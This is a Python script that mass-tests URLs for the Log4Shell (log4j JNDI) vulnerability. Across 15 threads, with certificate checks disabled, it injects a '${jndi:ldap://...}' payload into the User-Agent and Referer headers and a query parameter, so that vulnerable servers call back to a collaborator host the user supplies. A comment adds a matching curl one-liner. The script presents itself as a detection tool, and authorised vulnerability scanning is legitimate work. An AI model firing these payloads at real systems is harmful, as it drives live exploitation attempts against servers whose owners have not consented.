from sys import argv
from requests import get
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

disable_warnings()

proxies = {}
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def sendDetectionRequest(url, urlId):
    try:
        # log4j payload by lunasec
        # curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
        # The vulnerable instance of log4j running on port 8080 and the nc lister is placed on port 80
        # John Hammond Explanation: https://youtu.be/7qoPDq41xhQ?t=377
        payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
        params = {'id':payload}
        headers = {'User-Agent':payload, 'Referer':payload}
        url = url.strip()
        print('[{}] Testing {}'.format(urlId, url))
        get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
    except Exception as e:
        print(e)
        pass

threads = []
urlId = 0
if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urlList = urlFile.readlines()
    with ThreadPoolExecutor(max_workers=15) as executor:
        for url in urlList:
            urlId += 1
            threads.append(executor.submit(sendDetectionRequest, url, urlId))
else:
    print('[!] Syntax: python3 {} <urlFile> <collaboratorPayload>'.format(argv[0]))
